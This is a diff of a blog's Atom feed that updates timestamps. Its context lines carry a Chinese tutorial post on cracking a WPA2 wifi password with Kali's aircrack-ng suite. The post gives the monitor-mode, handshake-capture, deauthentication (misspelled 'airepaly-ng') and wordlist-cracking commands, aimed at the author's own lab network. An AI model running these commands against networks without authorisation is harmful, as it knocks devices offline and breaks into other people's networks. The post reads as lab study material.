@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-04-20T04:19:46.961Z</updated>
+  <updated>2018-04-20T04:22:34.704Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="http://yoursite.com/2018/04/19/wificrack/"/>
     <id>http://yoursite.com/2018/04/19/wificrack/</id>
     <published>2018-04-19T10:47:50.538Z</published>
-    <updated>2018-04-20T04:19:46.961Z</updated>
+    <updated>2018-04-20T04:22:34.704Z</updated>
     
     <content type="html"><![CDATA[<p><strong>kali无线网卡wifi破解</strong></p><a id="more"></a><h1 id="kali无线网卡wifi破解"><a href="#kali无线网卡wifi破解" class="headerlink" title="kali无线网卡wifi破解"></a>kali无线网卡wifi破解</h1><h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><p><strong>1.kali2.0操作系统，本人用的32位的，装在vm12虚拟机中</strong></p><p><strong>2.kali所支持的无线网卡，型号为RT3070，淘宝淘来的</strong></p><h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><p><strong>1.将usb无线网卡连入虚拟机</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/Dmj4eH7lf8.png?imageslim" alt="mark"><br><strong>2.查看无线网卡wlan0是否存在</strong></p><pre><code>iwconfig</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/HEKkcL16ae.png?imageslim" alt="mark"><br><strong>3.开启无线网卡的侦听功能</strong></p><pre><code>airmon-ng start wlan0</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/cBd1C0Fmi2.png?imageslim" alt="mark"><br><strong>如果出现无法侦听数据，先kill一下进程再重新启动一下无线网卡</strong></p><pre><code>airmon-ng check killairmon-ng start wlan0</code></pre><p><strong>4.iwconfig再次查看网卡，看到无线网卡已经变为了wlan0mon，说明无线网卡开启了监听功能</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/LF9m1D86jA.png?imageslim" alt="mark"><br><strong>5.使用无线网卡侦听附近的wifi信号</strong></p><pre><code>airodump-ng wlan0mon</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/j9JD8Ahaj1.png?imageslim" alt="mark"><br><strong>比较重要的几个值，BSSID代表无线网络的唯一标识，也就是路由的MAC地址，CH代表wifi信道，我们攻击的wifi选择了我们实验室的wifi:<code>secevery</code>，可以看到信号还是不错的</strong><br><strong>6.选择要破解的wifi并且抓取握手包</strong></p><pre><code>airodump-ng -c 信道 --bssid BSSID -w 保存文件 wlan0mon</code></pre><p><strong>在这里我们要攻击的BSSID为B0:E1:7E:7D:EA:CC，信道为1</strong></p><pre><code>airodump-ng -c 1 --bssid B0:E1:7E:7D:EA:CC -w secevery wlan0mon</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/88FcA7C3Il.png?imageslim" alt="mark"><br><strong>STATION为wifi下所有设备的MAC地址</strong><br><strong>7.如果抓不到握手包，就要模拟station，模拟其断开，就是踢掉相应的设备，使其重连再抓握手包，10表示发送10个包</strong><br>    airepaly-ng -0 10 -a BSSID -c 你要踢掉的设备的MAC地址 wlan0mon<br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/8Jj860fILB.png?imageslim" alt="mark"><br><strong>如果出现红框里的内容，说明抓到握手包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/Ig4ah756CG.png?imageslim" alt="mark"><br><strong>ls查看可以看到已经抓到握手包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/9m6JIILFFF.png?imageslim" alt="mark"></p><p><strong>8.进行wifi破解，破解成功</strong></p><pre><code>aircrack-ng -a2 -b B0:E1:7E:7D:EA:CC -w passwd.txt secevery-01.cap</code></pre><p><strong>其中a2代表wifi的加密协议为WPA2</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180419/fIiLEhjmD8.png?imageslim" alt="mark"></p>]]></content>
     
